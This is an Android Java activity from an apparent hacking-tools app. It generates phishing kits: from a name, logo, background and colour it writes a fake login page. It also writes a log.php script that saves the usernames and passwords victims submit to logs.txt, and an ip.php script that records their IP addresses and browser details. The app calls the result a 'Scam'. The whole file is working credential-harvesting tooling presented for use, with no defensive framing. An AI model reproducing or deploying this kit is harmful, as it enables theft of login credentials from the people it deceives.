package com.mgtols.neptyx;

import android.app.Activity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import android.widget.LinearLayout;
import android.widget.ImageView;
import android.widget.EditText;
import android.widget.Button;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.content.Intent;
import android.net.Uri;
import android.view.View;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.DialogFragment;
import android.Manifest;
import android.content.pm.PackageManager;


public class ScamaActivity extends  Activity { 
	
	
	private String home = "";
	private String colo = "";
	
	private LinearLayout linear1;
	private ImageView imageview1;
	private LinearLayout linear2;
	private EditText nombre;
	private EditText img;
	private EditText fondo;
	private EditText color;
	private Button button1;
	private WebView webview1;
	
	private Intent a = new Intent();
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.scama);
		initialize(_savedInstanceState);
		if (Build.VERSION.SDK_INT >= 23) {
			if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
			|| checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
				requestPermissions(new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
			}
			else {
				initializeLogic();
			}
		}
		else {
			initializeLogic();
		}
	}
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		if (requestCode == 1000) {
			initializeLogic();
		}
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		nombre = (EditText) findViewById(R.id.nombre);
		img = (EditText) findViewById(R.id.img);
		fondo = (EditText) findViewById(R.id.fondo);
		color = (EditText) findViewById(R.id.color);
		button1 = (Button) findViewById(R.id.button1);
		webview1 = (WebView) findViewById(R.id.webview1);
		webview1.getSettings().setJavaScriptEnabled(true);
		webview1.getSettings().setSupportZoom(true);
		
		imageview1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				a.setAction(Intent.ACTION_VIEW);
				a.setClass(getApplicationContext(), MenuActivity.class);
				startActivity(a);
				finish();
			}
		});
		
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				colo = "input[type=submit], select {\n  width: 100%;\n  padding: 12px 20px;\n  background-color:Aqui;\n  color:#ffffff;\n  font-family:Arial;\n  font-size:13px;\n  text-shadow:0px 1px 0px #154682;\n  margin: 8px 0;\n  display: inline-block;\n  border: 1px solid Aqui;\n  border-radius: 4px;\n  padding:12px 20px;\n  box-sizing: border-box;\n  background:linear-gradient(to bottom,  5%,  100%);\n  border:1px solid #678aa3;\n\n}";
				home = FileUtil.getExternalStorageDir().concat("/MgToLs/");
				FileUtil.makeDir(home.concat("Scam"));
				FileUtil.makeDir(home.concat("Scam/".concat(nombre.getText().toString())));
				FileUtil.writeFile(home.concat("Scam/".concat(nombre.getText().toString().concat("/".concat("index.html")))), "<html> <center> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes\" /> <link rel=\"stylesheet\" type=\"text/css\" href=\"color.css\"> <script LANGUAGE=\"JavaScript\"> function pantallaCompleta() { window.open('tupagina.abc', '', 'fullscreen=yes, scrollbars=auto, statusbar=no, left=1, top=1'); } </script> <style type=\"text/css\"> small { font-size: .5em } input[type=password], select { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } input[type=text], select { width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; } </style> <body background=\"fondo.png\"> 	<img src=\"name.png\" width=\"345\" height=\"200\"> <form id=\"formulario\" method=\"post\" action=\"log.php\"> <p> <label for=\"nombre\"><label> <input placeholder=\"Usuario\" type=\"text\" name=\"nombre\" id=\"nombre\" value=\"\" required> <p> <label for=\"apellidos\"></label> <input placeholder=\"ContraseÃ±a\"type=\"password\" name=\"apellidos\" id=\"apellidos\" value=\"\" required> <div class=\"input\"> <input placeholder=\"Iniciar Secion\" type=\"submit\" required> </button> <p> </div> <p> <p> <p> </center> </html>");
				FileUtil.moveFile(img.getText().toString(), home.concat("Scam/".concat(nombre.getText().toString().concat("/name.png"))));
				FileUtil.moveFile(fondo.getText().toString(), home.concat("Scam/".concat(nombre.getText().toString().concat("/fondo.png"))));
				FileUtil.writeFile(home.concat("Scam/".concat(nombre.getText().toString().concat("/".concat("log.php")))), "<?php // Programado por NePtYx $nombre = $_REQUEST[\"nombre\"]; $apellidos = $_REQUEST[\"apellidos\"]; $domicilio = $_REQUEST[\"domicilio\"]; $fecha = date(\"d/m/Y\"); $hora = date(\"H:i:s\"); define(\"precio1\", 1.75); define(\"precio2\", 1.05); $totalProducto = array(); $leerNumeroFactura = fopen(\".inf\", \"rb\"); $factura = fread($leerNumeroFactura, filesize(\".inf\")); fclose($leerNumeroFactura); $factura++; $leerNumeroFactura = fopen(\".inf\", \"wb\"); fwrite($leerNumeroFactura, $factura); fclose($leerNumeroFactura); if (isset($_REQUEST[\"producto1\"])) { $producto1 = $_REQUEST[\"producto1\"]; $cantidad1 = $_REQUEST[\"cantidad1\"]; $totalProducto[0] = precio1 * $cantidad1; } else { $producto1 = \" \"; $cantidad1 = 0; $totalProducto[0] = 0; } if (isset($_REQUEST[\"producto2\"])) { $producto2 = $_REQUEST[\"producto2\"]; $cantidad2 = $_REQUEST[\"cantidad2\"]; $totalProducto[1] = precio2 * $cantidad2; } else { $producto2 = \" \"; $cantidad2 = 0; $totalProducto[1] = 0; } $total = 0; for ($i = 0; $i < count($totalProducto); $i++) { $total += $totalProducto[$i]; } $IVA = $total * 0.04; $subtotal = $total - $IVA; $datos = fopen(\"logs.txt\", \"ab\"); fwrite($datos,\"Usuario: \".$nombre.\" Contraseña: \".$apellidos.\"\n\"); fclose($datos); echo \"<h2>Inicio de secion correctamente<br><br> Run: $nombre<br> Clave: $apellidos<br> Cuenta: $domicilio<br> $fecha $hora<br> ---------------------------------\n<br> </h2>\"; include('ip.php'); ?> </body> </html>");
				FileUtil.writeFile(home.concat("Scam/".concat(nombre.getText().toString().concat("/".concat("ip.php")))), "// Programado por NePtYx <?php $Fichero = \"ip.txt\"; $ip = $_SERVER[\"REMOTE_ADDR\"]; $fecha = date(\"Y-m-d;H:i:s\"); $sistema = $_SERVER['HTTP_USER_AGENT']; $conproxy = $_SERVER[\"HTTP_X_FORWARDED_FOR\"]; $log = \"FECHA: $fecha SISTEMA: $sistema IP: $ip IPPROXY: $conproxy \\x0D\\x0A\"; $fp = fopen($Fichero, \"a\" ); fwrite($fp, $log); fclose($fp); ?>");
				FileUtil.writeFile(home.concat("Scam/".concat(nombre.getText().toString().concat("/".concat("color.css")))), colo.replace("Aqui", color.getText().toString()));
				webview1.loadUrl("file://".concat(home.concat("Scam/".concat(nombre.getText().toString().concat("/".concat("index.html"))))));
				SketchwareUtil.showMessage(getApplicationContext(), "Scam guardado en ".concat(home.concat("Scam/".concat(nombre.getText().toString().concat("/")))));
			}
		});
		
		webview1.setWebViewClient(new WebViewClient() {
			@Override
			public void onPageStarted(WebView _param1, String _param2, Bitmap _param3) {
				final String _url = _param2;
				
				super.onPageStarted(_param1, _param2, _param3);
			}
			
			@Override
			public void onPageFinished(WebView _param1, String _param2) {
				final String _url = _param2;
				
				super.onPageFinished(_param1, _param2);
			}
		});
	}
	
	private void initializeLogic() {
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}